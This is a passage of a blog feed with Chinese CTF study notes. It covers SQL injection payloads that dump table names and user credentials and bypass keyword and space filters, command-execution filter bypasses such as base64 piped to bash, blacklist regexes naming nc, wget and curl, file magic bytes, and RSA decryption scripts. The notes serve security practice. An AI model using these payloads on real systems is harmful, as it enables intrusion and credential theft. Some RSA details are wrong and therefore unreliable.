        <content type="html"><![CDATA[<h1 id="关于sql注入"><a href="#关于sql注入" class="headerlink" title="关于sql注入"></a>关于sql注入</h1><h2 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> group_concat(table_name)from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&quot;web7&quot;</span>),3</span><br></pre></td></tr></table></figure><h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> group_concat(column_name)from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&quot;web7&quot;</span> and table_name=<span class="string">&quot;flag&quot;</span>),3</span><br></pre></td></tr></table></figure><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> flag from flag),3</span><br></pre></td></tr></table></figure><h2 id="获取flag-1"><a href="#获取flag-1" class="headerlink" title="获取flag"></a>获取flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span></span><br><span class="line"><span class="string">MD5 不光有ffifdyop 还有 129581926211651571912466741651878684928 也可达同样的效果</span></span><br><span class="line"><span class="string">总之，相当于 select * from admin where password=&#x27;</span><span class="string">&#x27;or ture</span></span><br></pre></td></tr></table></figure><h2 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from 表名字;#</span></span><br></pre></td></tr></table></figure><h2 id="handler查询字段内文字"><a href="#handler查询字段内文字" class="headerlink" title="handler查询字段内文字"></a>handler查询字段内文字</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;handler 字段名字 open;handler 字段名字 read 字段显示顺序（first）;handler 字段名字 close;#</span></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; oorrder bbyy 4 ;%23&amp;password=1</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,3;%23&amp;password=1234</span><br><span class="line">-1<span class="string">&#x27; uunionnion sselectelect 1,2,3;%23&amp;password=1234</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database();%23&amp;password=1</span><br><span class="line">-1<span class="string">&#x27; uunionnion sselectelect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;;%23&amp;password=1</span></span><br><span class="line"><span class="string">-1&#x27;</span> uunionnion sselectelect 1,2,group_concat(<span class="built_in">id</span>,username,passwoorrd) frfromom b4bsql;%23&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web2&quot;),3#</span></span><br><span class="line"><span class="string">1&#x27;</span>/**/union/**/select/**/1,(<span class="keyword">select</span>/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=<span class="string">&quot;web2&quot;</span>/**/and/**/table_name=<span class="string">&quot;flag&quot;</span>),3<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span></span><br></pre></td></tr></table></figure><h2 id="过滤＃号用单引号闭合"><a href="#过滤＃号用单引号闭合" class="headerlink" title="过滤＃号用单引号闭合"></a>过滤＃号用单引号闭合</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span></span><br><span class="line">1<span class="string">&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件格式</title>
      <link href="/2023/10/07/%E5%90%84%E7%A7%8D%E6%96%87%E4%BB%B6%E7%9A%84%E6%A0%BC%E5%BC%8F%E6%A0%87%E5%87%86/"/>
      <url>/2023/10/07/%E5%90%84%E7%A7%8D%E6%96%87%E4%BB%B6%E7%9A%84%E6%A0%BC%E5%BC%8F%E6%A0%87%E5%87%86/</url>
      
        <content type="html"><![CDATA[<h1 id="各种文件的标准头尾格式"><a href="#各种文件的标准头尾格式" class="headerlink" title="各种文件的标准头尾格式"></a>各种文件的标准头尾格式</h1><pre><code class="bash">JPEG (jpg)，文件头：FFD8FFPNG (png)，文件头：89504E47GIF (gif)，文件头：47494638TIFF (tif)，文件头：49492A00Windows Bitmap (bmp)，文件头：424DCAD (dwg)，文件头：41433130Adobe Photoshop (psd)，文件头：38425053Rich Text Format (rtf)，文件头：7B5C727466XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EEmail [thorough only] (eml)，文件头：44656C69766572792D646174653AOutlook Express (dbx)，文件头：CFAD12FEC5FD746FOutlook (pst)，文件头：2142444EMS Word/Excel (xls.or.doc)，文件头：D0CF11E0MS Access (mdb)，文件头：5374616E64617264204AWordPerfect (wpd)，文件头：FF575043Adobe Acrobat (pdf)，文件头：255044462D312EQuicken (qdf)，文件头：AC9EBD8FWindows Password (pwl)，文件头：E3828596ZIP Archive (zip)，文件头：504B0304RAR Archive (rar)，文件头：52617221Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920Real Audio (ram)，文件头：2E7261FDReal Media (rm)，文件头：2E524D46MPEG (mpg)，文件头：000001BAMPEG (mpg)，文件头：000001B3Quicktime (mov)，文件头：6D6F6F76Windows Media (asf)，文件头：3026B2758E66CF11MIDI (mid)，文件头：4D5468647z（zip）文件头：37 7A BC AF 27 1C···</code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2023/09/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/09/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>php的include可以载入一个外部php文件，其参数是一个文件名，既然是文件名，就不能带参数了。</p><p>php中，如果include载入的文件一定要带参数，就只有一种办法，即这个参数是一个全路径的URL地址。</p><h1 id="windows-下"><a href="#windows-下" class="headerlink" title="windows 下"></a>windows 下</h1><p>|直接执行后面的语句<br>||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>&amp;前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p><h1 id="Linux-下"><a href="#Linux-下" class="headerlink" title="Linux 下"></a>Linux 下</h1><p>;前面和后面命令都要执行，无论前面真假<br>|直接执行后面的语句<br>||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>&amp;前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%09`(需要php环境)</span><br><span class="line">`<span class="variable">$&#123;IFS&#125;</span>`</span><br><span class="line">`$IFS<span class="variable">$9</span>` //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">`&#123;<span class="built_in">cat</span>,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br></pre></td></tr></table></figure><h1 id="执行代码函数"><a href="#执行代码函数" class="headerlink" title="执行代码函数"></a>执行代码函数</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">create_function()</span><br><span class="line">array_map()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_filter</span><br><span class="line">usort</span><br><span class="line">uasort()</span><br><span class="line"><span class="variable">$&#123;&#125;</span>:中间的php代码将会被解析</span><br></pre></td></tr></table></figure><h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line"><span class="built_in">exec</span>()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure><p>PHP 支持一个执行运算符：反引号（&#96;）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“”的效果与函数 shell_exec() 相同。</p><h1 id="文件包含函数："><a href="#文件包含函数：" class="headerlink" title="文件包含函数："></a>文件包含函数：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require</span><br><span class="line">include</span><br><span class="line">require_ once</span><br><span class="line">include once</span><br></pre></td></tr></table></figure><h1 id="文件读取函数："><a href="#文件读取函数：" class="headerlink" title="文件读取函数："></a>文件读取函数：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">copy</span><br><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">fopen()</span><br><span class="line"><span class="built_in">read</span> file()</span><br><span class="line">fread()</span><br><span class="line">fgetss()</span><br><span class="line">fgets()</span><br><span class="line">parse_ini_file()</span><br><span class="line">show_source()</span><br><span class="line">file()</span><br></pre></td></tr></table></figure><h1 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line"><span class="built_in">head</span>:查看头几行</span><br><span class="line"><span class="built_in">tac</span>:从最后一行开始显示，可以看出 <span class="built_in">tac</span> 是 <span class="built_in">cat</span> 的反向显示</span><br><span class="line"><span class="built_in">tail</span>:查看尾几行</span><br><span class="line"><span class="built_in">nl</span>：显示的时候，顺便输出行号</span><br><span class="line"><span class="built_in">od</span>:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"><span class="built_in">sort</span>:可以查看</span><br><span class="line"><span class="built_in">uniq</span>: // <span class="built_in">uniq</span> 命令用于检查及删除文本文件中重复出现的行列</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">rev:反转查看</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="增加include函数使用伪协议"><a href="#增加include函数使用伪协议" class="headerlink" title="增加include函数使用伪协议"></a>增加include函数使用伪协议</h2><p>c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><h2 id="添加eval函数绕过检测"><a href="#添加eval函数绕过检测" class="headerlink" title="添加eval函数绕过检测"></a>添加eval函数绕过检测</h2><p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘ls’);</p><h2 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h2><p>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash &#x2F;&#x2F;cat flag<br>echo “Y2F0IC9mbGFn”|base64 -d|bash   &#x2F;&#x2F;cat &#x2F;flag<br>情况下可尝试sh)</p><h2 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h2><p>c””at fl’’ag</p><h2 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h2><p>c\at fl\ag</p><h2 id="正则-假设-x2F-bin-x2F-cat-test-是一个目录"><a href="#正则-假设-x2F-bin-x2F-cat-test-是一个目录" class="headerlink" title="正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)"></a>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/???/?[a][t] ?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>`</span><br><span class="line">`/???/?at ????`</span><br><span class="line">`/???/?[a]<span class="string">&#x27;&#x27;</span>[t] ?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> `<span class="built_in">ls</span>` <span class="comment">#查看当前目录的所有文件的内容。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> *     <span class="comment">#查看当前目录的所有文件的内容。</span></span><br></pre></td></tr></table></figure><p>“.&#x2F;“：代表目前所在的目录。</p><p>“ . .&#x2F;“代表上一层目录。</p><p>“&#x2F;“：代表根目录。</p><h2 id="web135无回显，命令长度限制"><a href="#web135无回显，命令长度限制" class="headerlink" title="web135无回显，命令长度限制"></a>web135无回显，命令长度限制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="built_in">eval</span>(substr(<span class="variable">$F</span>,0,6));</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>` ;<span class="built_in">ls</span>;  //相当于执行</span><br><span class="line"><span class="built_in">eval</span>(`<span class="variable">$F</span>` ;);</span><br><span class="line">``<span class="variable">$F</span>` ;<span class="built_in">ls</span>;`</span><br></pre></td></tr></table></figure><h3 id="另解cp命令"><a href="#另解cp命令" class="headerlink" title="另解cp命令"></a>另解cp命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>` ;<span class="built_in">cp</span> flag.php 666.txt</span><br><span class="line">?F=`<span class="variable">$F</span>` ;<span class="built_in">nl</span> flag.php&gt;666.txt</span><br><span class="line">?F=`<span class="variable">$F</span>` ;<span class="built_in">mv</span> flag.php 666.txt</span><br></pre></td></tr></table></figure><h1 id="文件改名"><a href="#文件改名" class="headerlink" title="文件改名"></a>文件改名</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> source_file(文件) dest_file(文件)</span><br></pre></td></tr></table></figure><p>将源文件名 source_file 改为目标文件名 dest_file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">       die(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>没有回显</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /|<span class="built_in">tee</span> 1</span><br><span class="line">?c=<span class="built_in">nl</span> /f149_15_h3r3|<span class="built_in">tee</span> 1</span><br><span class="line">?c=awk <span class="string">&#x27;/f/&#x27;</span> /f149_15_h3r3|<span class="built_in">tee</span> 1 // awk -f [file] 调用脚本</span><br></pre></td></tr></table></figure><p>awk 命令也是逐行扫描文件（从第 1 行到最后一行），寻找含有目标文本的行，如果匹配成功，则会在该行上执行用户想要的操作；反之，则不对行做任何处理</p><p>从脚本文件中读取 awk 脚本指令，以取代直接在命令行中输入指令</p><p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2023/09/17/rsa/"/>
      <url>/2023/09/17/rsa/</url>
      
        <content type="html"><![CDATA[<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1> <span id="more"></span><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><p>欧拉定理</p><p>若n为素数欧拉(n)&#x3D;n-1;</p><p>e与欧拉(n)互质    公钥e,n 私钥d,n</p><p>M为明文，C为密文；</p><p>M^e mod n&#x3D;C</p><p>C^d mod n &#x3D;M</p><p>ed&#x3D;1(mod欧拉(n))</p><p>d为模反元素计算公式，d&#x3D;gmpy2.invert(e,(p-1)*(q-1))</p><p><code>n=p*q  ，欧拉n=(p-1)*(q-1)</code></p><p>已知dp，dq，p，q，c</p><blockquote><p>dp&#x3D;d%(p-1)</p><p>dq&#x3D;d%(q-1)</p></blockquote><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82943615?ops_request_misc=&request_id=&biz_id=102&utm_term=ctf%20rsa&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-82943615.142%5Ev70%5Eone_line,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">rsa解密详解以及脚本</a>.<br><a href="https://blog.csdn.net/vhkjhwbs/article/details/101160822?ops_request_misc=&request_id=&biz_id=102&utm_term=ctf%20rsa&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-101160822.142%5Ev70%5Eone_line,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">rsa解密详解以及脚本</a>;</p><h2 id="gmpy2常见函数使用"><a href="#gmpy2常见函数使用" class="headerlink" title="gmpy2常见函数使用"></a>gmpy2常见函数使用</h2><p><strong>1.初始化大整数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.mpz(909090)</span><br><span class="line">result:mpz(909090)</span><br></pre></td></tr></table></figure><p><strong>2.求大整数a,b的最大公因数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.gcd(6,18)</span><br><span class="line">result:mpz(6)</span><br></pre></td></tr></table></figure><p><strong>3.求大整数x模m的逆元y</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">#4*6 ≡ 1 mod 23</span><br><span class="line">gmpy2.invert(4,23)</span><br><span class="line">result:mpz(6)</span><br></pre></td></tr></table></figure><p><strong>4.检验大整数是否为偶数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_even(6)</span><br><span class="line">result:True</span><br><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_even(7)</span><br><span class="line">result:False</span><br></pre></td></tr></table></figure><p><strong>5.检验大整数是否为奇数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_odd(6)</span><br><span class="line">result:False</span><br><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_odd(7)</span><br><span class="line">result:True</span><br></pre></td></tr></table></figure><p><strong>6.检验大整数是否为素数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_prime(5)</span><br><span class="line">result:True</span><br></pre></td></tr></table></figure><p><strong>7.求大整数x开n次根</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.iroot(81,2)</span><br><span class="line">result:(mpz(9),True)</span><br></pre></td></tr></table></figure><p><strong>8.求大整数x的y次幂模m取余</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">#2^4 mod 5 </span><br><span class="line">gmpy2.powmod(2,4,15)</span><br><span class="line">result:mpz(1)</span><br></pre></td></tr></table></figure><p>libnum库<br>十进制转字符串 libnum.n2s(j)</p><h2 id="已知p-q-e，求d。"><a href="#已知p-q-e，求d。" class="headerlink" title="已知p, q, e，求d。"></a>已知p, q, e，求d。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 447685307</span><br><span class="line">q = 2037</span><br><span class="line">e = 17</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h2 id="已知-p-q-e-c-，求m。"><a href="#已知-p-q-e-c-，求m。" class="headerlink" title="已知(p, q, e,c)，求m。"></a>已知(p, q, e,c)，求m。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p=447685307</span><br><span class="line">q=2037</span><br><span class="line">e=17</span><br><span class="line">c=704796792</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line"></span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h2 id="已知p-q-dp-dq-c-求m"><a href="#已知p-q-dp-dq-c-求m" class="headerlink" title="已知p,q,dp,dq,c,求m"></a>已知p,q,dp,dq,c,求m</h2><p>buu RSA1</p><p>所需要求的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure><p>(1)计算q逆模q1;<br>(2)计算m1为c的dp次方再对p求模<br>(3)计算m2为c的dq次方再对q求模<br>(4)m &#x3D; ((((m2 - m1) * p1) % q) * p + m2) % n;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">dp = </span><br><span class="line">dq = </span><br><span class="line">c = </span><br><span class="line">n = p * q</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">p1 = gmpy2.invert(q, p)</span><br><span class="line">m = ((((m2 - m1) * p1) % q) * p + m2) % n</span><br><span class="line"><span 